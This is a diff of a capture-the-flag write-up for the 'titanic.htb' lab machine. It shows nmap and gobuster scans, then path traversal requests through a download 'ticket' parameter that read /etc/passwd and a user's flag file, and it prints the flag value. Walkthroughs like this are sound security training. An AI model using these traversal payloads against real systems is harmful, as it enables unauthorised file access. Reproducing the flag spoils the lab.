@@ -2,45 +2,65 @@ Let's scan the IP address
 ```bash
 sudo nmap -v -sC -sV 10.10.11.55
 ```
-![[2025-03-06_16-08.png]]
+
+![image](images/2025-03-06_16-08.png)
+
 Let's go to the site
-![[2025-03-06_16-13.png]]
+
+![image](images/2025-03-06_16-13.png)
+
 Let's check for directories
 ```bash
 gobuster dir --wordlist=/usr/share/wordlists/rockyou.txt -u http://titanic.htb/
 ```
-![[2025-03-06_16-05.png]]
+
+![image](images/2025-03-06_16-05.png)
+
 Directory `/download` was found. Let's go to it
 ```URL
 http://http://titanic.htb/download
 ```
-![[2025-03-06_16-15.png]]
+
+![image](images/2025-03-06_16-15.png)
+
 Error `{"error":"Ticket parameter is required"}`. This means that a ticket must be passed in the `URL`. Let's try to pass ticket `123`
 ```URL
 http://titanic.htb/download?ticket=123
 ```
-![[2025-03-06_16-16.png]]
+
+![image](images/2025-03-06_16-16.png)
+
 Ticket not found. Most likely, the ticket is a file that the site allows you to download. Let's try to exploit `path traversal`. Download file `/etc/passwd`
 ```URL
 //http://titanic.htb/download?ticket=../../../../etc/passwd
 ```
-![[2025-03-06_16-18.png]]
-![[2025-03-06_16-19.png]]
+
+![image](images/2025-03-06_16-18.png)
+
+![image](images/2025-03-06_16-19.png)
+
 The vulnerability worked. Here at least the users `developer` and `root` are interesting
 Let's try to get into the home directory of `developer` and find the flag `user.txt`
-``URL
+```URL
 http://titanic.htb/download?ticket=../../../../home/developer/user.txt
 ```
-![[2025-03-06_16-24.png]]
+
+![image](images/2025-03-06_16-24.png)
+
 The first flag is
 ```flag
 00ac3cda319b165b9a529d42af6c17f9
 ```
 If there is `developer`, then most likely there is a subdomain `dev`. Let's check it out
-![[2025-03-06_17-12.png]]
+
+![image](images/2025-03-06_17-12.png)
+
 Let's try adding this subdomain to `/etc/hosts`
-![[2025-03-06_17-14.png]]
-![[2025-03-06_17-11.png]]
+
+![image](images/2025-03-06_17-14.png)
+
+![image](images/2025-03-06_17-11.png)
+
 Now we have access to the `dev` subdomain.
 Press the `Explore` button.
 
